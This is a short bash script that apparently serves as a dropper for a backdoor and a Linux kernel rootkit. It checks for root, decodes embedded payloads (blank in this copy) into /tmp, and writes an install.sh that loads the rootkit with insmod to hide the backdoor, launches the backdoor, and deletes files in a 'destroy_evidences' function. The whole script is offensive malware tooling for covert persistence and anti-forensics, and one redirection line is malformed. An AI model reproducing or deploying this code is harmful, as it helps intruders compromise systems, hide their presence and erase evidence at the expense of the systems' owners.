#!/bin/bash

backdoor_bin=''
backdoor_path='/tmp/backdoor'
rootkit_bin=''
rootkit_path='/tmp/rootkit.ko'
install_script='install.sh'

if [ `id -u` == '0' ]
then
    echo 'je suis root! Lets go baby'
else
    echo 'je ne suis pas root, dommage...'
fi

# Create backdoor file
cmd="'import base64;f=open(\"$backdoor_path\",\"wb\");f.write(base64.b64decode(\"$backdoor_bin\"));f.close()'"
python_cmd="python -c $cmd"
eval "$python_cmd"

if [ "$?" != 0 ]; then
    echo "Error creating $backdoor_path"
fi
chmod 700 $backdoor_path

# Create rootkit file
cmd="'f=open(\"$rootkit_path\",\"wb\");f.write(\"$rootkit_bin\".decode(\"hex\"));f.close()'"
python_cmd="python -c $cmd"
eval "$python_cmd"

if [ "$?" != 0 ]; then
    echo "Error creating $rootkit_path"
fi
chmod 700 $rootkit_path

# Shoudl I export variable environment (BACKDOOR_PATH & ROOTKIT_PATH) 
# and hide them from regular user.

cat <<EOF>> $install_script
#!/bin/bash

lkm_path="$rootkit_path"
bd_path="$backdoor_path"

start_rootkit() {
    if [ ! -f \$lkm_path ]; then
        echo "\$lkm_path does not exist!"
    fi
    # enable hiding of the backdoor
    insmod \$lkm_path > /dev/null > > /dev/null 2>&1
}

start_backoor() {
    if [ ! -f \$bd_path ]; then
        echo "\$bd_path does not exist!"
    fi

    #launch the backdoor
    eval \$bd_path
}

stop_rootkit() {
    rmmod \`basename \$lkm_path\` > /dev/null 2>&1
}

destroy_evidences() {
    rm \$lkm_path
    rm \$bd_path
}
EOF
chmod 700 $install_script
